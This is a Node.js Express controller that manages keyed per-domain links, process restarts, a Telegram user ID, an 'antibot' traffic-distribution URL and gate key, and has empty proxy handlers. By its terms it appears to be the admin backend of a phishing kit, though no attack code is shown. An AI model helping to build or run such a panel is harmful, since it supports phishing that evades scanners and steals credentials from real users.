const fs = require('fs')
const { validationResult } = require('express-validator');
const superagent = require('superagent')



exports.getLinks = (req, res) => {

    const linkList = []


    let userFileObj = JSON.parse(fs.readFileSync('./nkp/config/user.json'))
    const srcKey = userFileObj.SRC_KEY


    const sslFileObj = JSON.parse(fs.readFileSync('./nkp/config/ssl.json'))
    sslFileObj.forEach(sslInfo =>  {
        const formattedLink = `https://${sslInfo.domain}/?${srcKey}`
        linkList.push(formattedLink)
    })

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully fetched all links, No: ${linkList.length}`,
        info: linkList,
    })

}


exports.getProcessInfo = (req, res) => {

}

exports.execProcessAction = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }


    const execAction = req.body.state

    let execUrl = ''
    if (execAction === 'START') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/start`
    } else if (execAction === 'STOP') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/stop`
    } else if (execAction === 'RESTART') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/restart`
    } else {
        return res.json({
            status: "Error",
            error: 'Invalid Action',
            code: 1,
            message: `Cannot understand the action: ${execAction} given to server...`,
        })
    }

    superagent.get(execUrl)
        .end((err, resp) => {
            if (err) {
                console.error(err)
                    return res.json({
                    status: "Error",
                    error: err,
                    code: 1,
                    message: `Failed to execute action: ${execAction} on server`,
                })
            }
                return res.json({
                status: "Success",
                error: null,
                code: 0,
                message: `Successfully executed action: ${execAction}, Please Restart nkp to effect changes`,
                info: execAction,
            })
                    
        })

}

exports.setTelegramID = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const telegramID = req.body.telegramID

    const userFileObj = JSON.parse(fs.readFileSync('./nkp/config/user.json'))

    userFileObj.TELEGRAM_USER_ID = telegramID

    fs.writeFileSync('./nkp/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Telegram ID to ${telegramID}`,
        info: telegramID,
    })
}

exports.changeAntibot = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }


    const antibotSwitch = req.body.antibot
    
    let antibotUrl, tdsKey
    
    if (antibotSwitch === false) {
        antibotUrl = 'http:/127.0.0.1/3000'

        tdsKey = ''
    
    } else {
        const antibotInfo = req.body.antibotInfo


        const antibotInfoList = antibotInfo.split(';')


        antibotUrl = antibotInfoList[0]

        tdsKey = antibotInfoList[1]


    }


    const userFileObj = JSON.parse(fs.readFileSync('./nkp/config/user.json'))

    userFileObj.GATE_KEY = tdsKey

    userFileObj.TDS_URL = antibotUrl


    fs.writeFileSync('./nkp/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully changed antibot to ${antibotSwitch}`,
        info: antibotSwitch,
    })
}

exports.setProxy = (req, res) => {

}
